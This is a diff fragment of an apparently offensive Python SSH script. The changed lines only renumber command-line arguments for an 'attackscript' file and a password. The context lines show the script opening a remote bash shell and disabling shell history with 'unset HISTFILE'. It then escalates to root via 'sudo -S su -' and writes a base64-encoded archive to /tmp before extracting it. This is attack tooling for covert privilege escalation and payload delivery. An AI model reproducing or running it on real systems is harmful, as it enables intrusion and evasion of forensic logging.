@@ -30,7 +30,7 @@ ssh_stderr=""
 #try:
 chan = client.get_transport().open_session()
 
-attackscripthandle = open (sys.argv[5],"rb")
+attackscripthandle = open (sys.argv[4],"rb")
 attackscript = attackscripthandle.read()
 
 #attackscriptbytes = attackscript.encode("ascii")
@@ -43,7 +43,7 @@ ssh_stdin, ssh_stdout, ssh_stderr = client.exec_command('/bin/bash')
 ssh_stdin.write('unset HISTFILE\n')
 ssh_stdin.write('/usr/bin/sudo -S su -\n')
 time.sleep(1)
-ssh_stdin.write(sys.argv[4]+'\n')
+ssh_stdin.write(sys.argv[3]+'\n')
 ssh_stdin.write('echo '+a64blob+'| base64 -d > /tmp/remote.tgz\n')
 ssh_stdin.write('cd /tmp\n')
 ssh_stdin.write('tar zxf /tmp/remote.tgz\n')
